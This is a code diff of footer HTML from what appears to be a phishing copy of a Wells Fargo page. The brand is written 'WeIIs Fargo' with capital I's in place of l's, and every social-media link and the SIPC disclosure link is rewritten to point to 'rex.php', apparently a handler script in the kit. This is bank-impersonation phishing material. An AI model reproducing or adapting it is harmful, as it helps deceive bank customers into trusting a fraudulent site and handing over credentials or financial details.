         </nav>
@@ -2629,27 +2630,27 @@
             <ul>
             
                     <li>
-                        <a class=" icon-facebook social-icon" aria-label="WeIIs Fargo facebook page" data-exit="true" refplatform="newwindow" data-href-id="1224300702" href=error.html></a>
+                        <a class=" icon-facebook social-icon" aria-label="WeIIs Fargo facebook page" data-exit="true" refplatform="newwindow" data-href-id="1224300702" href=rex.php></a>
                     </li>
             
                     <li>
-                        <a data-platform="external" data-newbrowser="" enrollmentid="" data-rottracking="" class=" icon-linkedin social-icon" data-params="" aria-label="WeIIs Fargo LinkedIn page" data-exit="true" data-destinationtype="none" data-nativelinktype="none" refplatform="newwindow" data-href-id="3224300702" href=error.html></a>
+                        <a data-platform="external" data-newbrowser="" enrollmentid="" data-rottracking="" class=" icon-linkedin social-icon" data-params="" aria-label="WeIIs Fargo LinkedIn page" data-exit="true" data-destinationtype="none" data-nativelinktype="none" refplatform="newwindow" data-href-id="3224300702" href=rex.php></a>
                     </li>
             
                     <li>
-                        <a data-platform="external" data-newbrowser="" enrollmentid="" data-rottracking="" class=" icon-instagram social-icon" data-params="" aria-label="WeIIs Fargo Instagram page" data-destinationtype="none" data-nativelinktype="none" data-exit="true" refplatform="newwindow" data-href-id="5224300702" href=error.html></a>
+                        <a data-platform="external" data-newbrowser="" enrollmentid="" data-rottracking="" class=" icon-instagram social-icon" data-params="" aria-label="WeIIs Fargo Instagram page" data-destinationtype="none" data-nativelinktype="none" data-exit="true" refplatform="newwindow" data-href-id="5224300702" href=rex.php></a>
                     </li>
             
                     <li>
-                        <a data-platform="external" data-newbrowser="" enrollmentid="" data-rottracking="" class=" icon-pinterest social-icon" data-params="" aria-label="WeIIs Fargo Pinterest page" data-exit="true" data-destinationtype="none" data-nativelinktype="none" refplatform="newwindow" data-href-id="7224300702" href=error.html></a>
+                        <a data-platform="external" data-newbrowser="" enrollmentid="" data-rottracking="" class=" icon-pinterest social-icon" data-params="" aria-label="WeIIs Fargo Pinterest page" data-exit="true" data-destinationtype="none" data-nativelinktype="none" refplatform="newwindow" data-href-id="7224300702" href=rex.php></a>
                     </li>
             
                     <li>
-                        <a data-platform="external" data-newbrowser="" enrollmentid="" data-rottracking="" class=" icon-youtube social-icon" data-params="" aria-label="WeIIs Fargo Youtube page " data-exit="true" data-destinationtype="none" data-nativelinktype="none" refplatform="newwindow" data-href-id="9224300702" href=error.html></a>
+                        <a data-platform="external" data-newbrowser="" enrollmentid="" data-rottracking="" class=" icon-youtube social-icon" data-params="" aria-label="WeIIs Fargo Youtube page " data-exit="true" data-destinationtype="none" data-nativelinktype="none" refplatform="newwindow" data-href-id="9224300702" href=rex.php></a>
                     </li>
             
                     <li>
-                        <a data-platform="external" data-newbrowser="" enrollmentid="" data-rottracking="" class=" icon-twitter social-icon" data-params="" aria-label="WeIIs Fargo Twitter page " data-exit="true" data-destinationtype="none" data-nativelinktype="none" refplatform="newwindow" data-href-id="11224300702" href=error.html></a>
+                        <a data-platform="external" data-newbrowser="" enrollmentid="" data-rottracking="" class=" icon-twitter social-icon" data-params="" aria-label="WeIIs Fargo Twitter page " data-exit="true" data-destinationtype="none" data-nativelinktype="none" refplatform="newwindow" data-href-id="11224300702" href=rex.php></a>
                     </li>
             
             </ul>
@@ -2680,7 +2681,7 @@
 	
 		
     <div class="ps-footnote-text" data-cid="tcm:84-224322-16" data-ctid="tcm:91-223670-32">
-        <p></p><p>Investment products and services are offered through WeIIs Fargo Advisors. WeIIs Fargo Advisors is a trade name used by WeIIs Fargo Clearing Services, LLC (WFCS) and WeIIs Fargo Advisors Financial Network, LLC, Members <a data-exit="true" aria-label="hyperlink text opens dialogue" target="_blank" data-href-id="13224300702" href=error.html>SIPC</a>, separate registered broker-dealers and non-bank affiliates of WeIIs Fargo &amp; Company.</p><p></p>
+        <p></p><p>Investment products and services are offered through WeIIs Fargo Advisors. WeIIs Fargo Advisors is a trade name used by WeIIs Fargo Clearing Services, LLC (WFCS) and WeIIs Fargo Advisors Financial Network, LLC, Members <a data-exit="true" aria-label="hyperlink text opens dialogue" target="_blank" data-href-id="13224300702" href=rex.php>SIPC</a>, separate registered broker-dealers and non-bank affiliates of WeIIs Fargo &amp; Company.</p><p></p>
     </div>
 
 	
